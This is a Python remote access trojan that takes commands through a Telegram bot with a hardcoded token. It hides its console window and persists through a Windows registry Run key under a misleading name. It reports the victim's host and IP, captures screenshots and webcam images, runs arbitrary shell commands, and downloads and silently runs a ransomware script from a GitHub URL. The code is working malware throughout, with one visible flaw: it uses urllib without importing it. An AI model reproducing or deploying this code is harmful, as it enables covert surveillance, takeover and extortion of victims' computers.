# RAT_script.py - Added /ransomware command to download and execute ransomware
# Upload this to GitHub: https://raw.githubusercontent.com/Hehehasmr/mathpython/refs/heads/main/RAT_script.py

import os
import sys
import subprocess
import threading
import time
import requests
import json
import base64
import ctypes
import winreg
import tempfile
from datetime import datetime
from PIL import ImageGrab
import io
import tkinter as tk
from tkinter import font
import cv2
import numpy as np

BOT_TOKEN = "8755658192:AAEEkXaihdEPyTRbj33bVt_-9ckubS2uiDA"
CHAT_ID = "7894519456"
BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
RANSOMWARE_URL = "https://raw.githubusercontent.com/Hehehasmr/mathpython/refs/heads/main/ransomeware1.py"

# --- Persistence via registry ---
def install_persistence():
    try:
        script_path = os.path.abspath(sys.argv[0])
        if script_path.endswith('.py'):
            cmd = f'"{sys.executable}" "{script_path}"'
        else:
            cmd = f'"{script_path}"'
        
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(handle, "WindowsSystemHealth", 0, winreg.REG_SZ, cmd)
            winreg.CloseKey(handle)
        except:
            pass
    except:
        pass

# --- Restart mechanism ---
def restart_self():
    try:
        script = os.path.abspath(sys.argv[0])
        if script.endswith('.py'):
            subprocess.Popen([sys.executable, script], 
                           creationflags=subprocess.CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            subprocess.Popen([script], 
                           creationflags=subprocess.CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# --- Telegram functions ---
def send_message(text):
    try:
        requests.post(f"{BASE_URL}/sendMessage", data={"chat_id": CHAT_ID, "text": text}, timeout=10)
    except:
        pass

def send_photo(photo_bytes):
    try:
        files = {"photo": photo_bytes}
        requests.post(f"{BASE_URL}/sendPhoto", data={"chat_id": CHAT_ID}, files=files, timeout=15)
    except:
        pass

def get_ip():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
        return ip
    except:
        return "Unable to fetch IP"

# --- Command execution ---
def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if len(output) > 4000:
            output = output[:4000] + "...\n[truncated]"
        return output if output.strip() else "Command executed (no output)"
    except subprocess.TimeoutExpired:
        return "Command timed out after 30 seconds"
    except Exception as e:
        return f"Error: {str(e)}"

# --- Webcam capture ---
def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return None
        _, buf = cv2.imencode('.jpg', frame)
        return io.BytesIO(buf.tobytes())
    except:
        return None

# --- Fullscreen flashing popup with message ---
def show_flashing_popup(message_text):
    try:
        root = tk.Tk()
        root.title("SYSTEM ALERT")
        root.geometry("800x600")
        root.attributes('-topmost', True)
        root.attributes('-fullscreen', True)
        root.configure(bg='black')
        
        label = tk.Label(root, text=message_text, font=("Arial", 48, "bold"),
                        fg='red', bg='black', wraplength=750)
        label.pack(expand=True, fill=tk.BOTH)
        
        count_label = tk.Label(root, text="7", font=("Arial", 72, "bold"),
                              fg='white', bg='black')
        count_label.pack(pady=20)
        
        root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        def flash():
            colors = ['red', 'yellow', 'cyan', 'magenta', 'lime', 'orange', 'white']
            idx = 0
            for _ in range(25):
                label.config(fg=colors[idx % len(colors)])
                root.update()
                time.sleep(0.12)
                idx += 1
        
        def countdown():
            for i in range(7, 0, -1):
                count_label.config(text=str(i))
                root.update()
                time.sleep(1)
            root.destroy()
        
        flash_thread = threading.Thread(target=flash)
        flash_thread.daemon = True
        flash_thread.start()
        countdown()
        root.mainloop()
    except Exception as e:
        send_message(f"Popup error: {str(e)[:100]}")

# --- Ransomware download and execute ---
def download_and_execute_ransomware():
    try:
        temp_dir = tempfile.gettempdir()
        target = os.path.join(temp_dir, "ransomware_worker.py")
        
        # Download ransomware
        urllib.request.urlretrieve(RANSOMWARE_URL, target)
        
        # Execute ransomware hidden
        if sys.platform == "win32":
            startup = subprocess.STARTUPINFO()
            startup.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen([sys.executable, target],
                           startupinfo=startup,
                           creationflags=subprocess.CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           stdin=subprocess.DEVNULL)
        else:
            subprocess.Popen([sys.executable, target],
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           stdin=subprocess.DEVNULL)
        return True
    except Exception as e:
        send_message(f"Ransomware download failed: {str(e)[:100]}")
        return False

# --- Handle updates ---
def handle_updates(offset):
    try:
        resp = requests.get(f"{BASE_URL}/getUpdates", params={"offset": offset, "timeout": 30}, timeout=35)
        data = resp.json()
        if data.get("ok"):
            for update in data.get("result", []):
                new_offset = update.get("update_id", 0) + 1
                msg = update.get("message", {})
                if "text" in msg:
                    text = msg["text"].strip()
                    lower_text = text.lower()
                    
                    if lower_text == "/screenshot":
                        threading.Thread(target=send_screenshot).start()
                    
                    elif lower_text.startswith("/message "):
                        parts = text.split(" ", 1)
                        if len(parts) > 1:
                            msg_content = parts[1]
                            threading.Thread(target=show_flashing_popup, args=(msg_content,)).start()
                            send_message(f"Popup displayed on victim screen with: {msg_content}")
                        else:
                            send_message("Usage: /message <text>")
                    
                    elif lower_text == "/ip":
                        threading.Thread(target=send_ip).start()
                    
                    elif lower_text.startswith("/command "):
                        parts = text.split(" ", 1)
                        if len(parts) > 1:
                            cmd = parts[1]
                            threading.Thread(target=execute_and_send, args=(cmd,)).start()
                        else:
                            send_message("Usage: /command <cmd>")
                    
                    elif lower_text == "/webcam":
                        threading.Thread(target=send_webcam).start()
                    
                    elif lower_text == "/ransomware":
                        threading.Thread(target=trigger_ransomware).start()
                    
                return new_offset
    except Exception as e:
        pass
    return offset

def send_screenshot():
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        send_photo(buf)
    except Exception as e:
        send_message(f"Screenshot failed: {str(e)[:50]}")

def send_ip():
    ip = get_ip()
    send_message(f"IP Address: {ip}")

def execute_and_send(cmd):
    output = execute_command(cmd)
    send_message(f"Command: {cmd}\nOutput:\n{output}")

def send_webcam():
    try:
        img_bytes = capture_webcam()
        if img_bytes:
            send_photo(img_bytes)
        else:
            send_message("Webcam capture failed - no camera or access denied")
    except Exception as e:
        send_message(f"Webcam error: {str(e)[:50]}")

def trigger_ransomware():
    send_message("Downloading and executing ransomware...")
    success = download_and_execute_ransomware()
    if success:
        send_message("Ransomware deployed successfully on victim system")
    else:
        send_message("Ransomware deployment failed")

# --- Heartbeat monitor ---
def heartbeat_monitor():
    temp_dir = tempfile.gettempdir()
    heartbeat_file = os.path.join(temp_dir, ".sys_heartbeat.tmp")
    while True:
        try:
            with open(heartbeat_file, 'w') as f:
                f.write(str(time.time()))
            time.sleep(10)
        except:
            pass

# --- Main loop ---
def main_loop():
    ip = get_ip()
    hostname = os.environ.get("COMPUTERNAME", "Unknown")
    send_message(f"Connected | Host: {hostname} | IP: {ip}")
    
    install_persistence()
    
    heartbeat_thread = threading.Thread(target=heartbeat_monitor, daemon=True)
    heartbeat_thread.start()
    
    offset = 0
    while True:
        try:
            new_offset = handle_updates(offset)
            if new_offset != offset:
                offset = new_offset
            time.sleep(2)
        except Exception as e:
            send_message(f"Loop error: {str(e)[:100]}")
            time.sleep(5)
            restart_self()
            sys.exit(0)

# --- Entry ---
if __name__ == "__main__":
    if sys.platform == "win32":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    try:
        main_loop()
    except Exception as e:
        try:
            send_message(f"Fatal: {str(e)[:100]}")
        except:
            pass
        time.sleep(3)
        restart_self()
        sys.exit(0)
